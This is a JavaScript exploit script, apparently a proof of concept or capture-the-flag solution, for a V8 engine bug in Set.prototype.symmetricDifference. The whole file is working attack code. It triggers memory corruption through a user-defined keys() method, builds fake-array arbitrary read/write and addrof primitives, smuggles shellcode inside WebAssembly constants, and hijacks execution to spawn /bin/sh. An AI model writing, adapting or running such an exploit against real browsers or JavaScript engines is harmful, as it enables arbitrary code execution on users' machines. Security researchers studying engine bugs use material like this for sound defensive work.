/* helpers */

let fi_buf = new ArrayBuffer(8); // shared buffer
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert bigint to hex string
function hex(i) {
    return '0x' + i.toString(16);
}


let a = new Set();
for (let i = 0; i < 64; i++) { a.add(i); } // elements: 64, capacity: 64
let b = new Set();

let fake_arr_struct;
let obj_arr;

let arr_map = 0x18efb1n;
let properties = 0x6cdn;
let elements = 0x24n;
let len = 0x1n << 1n;

b.keys = () => {
    fake_arr_struct = [2261634.5098039214, 1.1, 2.2];
    a.add(64); // reallocated table, elements: 65, capacity: 128
    obj_arr = [{}];

    return b[Symbol.iterator]();
}

let s = a.symmetricDifference(b);
for (let i = 0; i < 0x10; i++) { s.delete(i); }

fake_arr_struct[1] = itof(properties << 32n | arr_map);
fake_arr_struct[2] = itof(len << 32n | elements - 8n + 1n);
let fake_arr = s.size;

/* arbitrary address read */
function aar(addr) {
    fake_arr_struct[2] = itof(len << 32n | addr - 8n + 1n);
    return ftoi(fake_arr[0]);
}

/* arbitrary address write */
function aaw(addr, value) {
    fake_arr_struct[2] = itof(len << 32n | addr - 8n + 1n);
    fake_arr[0] = itof(value);
}

/* leak address of fake_arr (for reliability) */
let fake_arr_addr = 0x4a000n;
while (true) {
    fake_arr_struct[2] = itof(len << 32n | fake_arr_addr - 8n + 1n);
    if (ftoi(fake_arr[0]) == 0x4141414141414141n) break;
    else fake_arr_addr += 4n;
}
fake_arr_addr += 8n;
console.log('[+] address of fake_arr: ' + hex(fake_arr_addr));

/* leak address of obj_arr[0] (for reliability) */
obj_arr[0] = fake_arr;
let obj_arr_addr = fake_arr_addr + 0x30n;
while (true) {
    fake_arr_struct[2] = itof(len << 32n | obj_arr_addr - 8n + 1n);
    if (ftoi(fake_arr[0]) % 0x100000000n == fake_arr_addr + 1n) break;
    else obj_arr_addr += 4n;
}
console.log('[+] address of obj_arr[0]: ' + hex(obj_arr_addr));

/* get address of |obj| */
function addrof(obj) {
    obj_arr[0] = obj;
    return aar(obj_arr_addr) & 0xfffffffen;
}

/* execve("/bin/sh", 0, 0) */
let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 68, 1, 66, 0, 68, 104, 47, 98, 105, 110, 88, 235, 7, 68, 104, 47, 115, 104, 0, 91, 235, 7, 68, 72, 193, 227, 32, 144, 144, 235, 7, 68, 72, 1, 216, 80, 144, 144, 235, 7, 68, 72, 137, 231, 144, 144, 144, 235, 7, 68, 72, 49, 192, 176, 59, 144, 235, 7, 68, 72, 49, 246, 72, 49, 210, 15, 5, 15, 11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
let sh = wasmInstance.exports.main;

let wasmInstance_addr = addrof(wasmInstance);
console.log('[+] address of wasmInstance: ' + hex(wasmInstance_addr));

let rwx = aar(wasmInstance_addr + 0x48n);
console.log('[+] address of rwx region: ' + hex(rwx));

aaw(wasmInstance_addr + 0x48n, rwx + 0x81an); // overwrite instruction pointer
sh(); // execute shellcode